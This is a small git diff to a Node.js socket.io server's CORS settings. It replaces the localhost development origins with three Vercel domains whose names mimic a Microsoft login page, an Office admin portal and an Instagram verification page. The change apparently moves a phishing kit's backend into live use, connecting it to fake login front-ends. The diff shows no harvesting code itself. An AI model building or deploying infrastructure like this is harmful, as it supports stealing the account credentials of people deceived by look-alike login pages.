@@ -21,10 +21,9 @@ const server = http.createServer(app);
 const io = new Server(server, {
   cors: {
     origin: [
-      // "https://login-microsoftonlinecom-cd6683a6-git-69f45d.vercel.app",
-      // "https://officeadmin-ochre.vercel.app",
-      "http://localhost:5173",
-      "http://localhost:5174",
+      "https://login-microsoftonlinecom-cd6683a6-git-69f45d.vercel.app",
+      "https://officeadmin-ochre.vercel.app",
+      "https://verify-unaccredited-instagram.vercel.app",
     ],
     methods: ["GET", "POST"],
   },
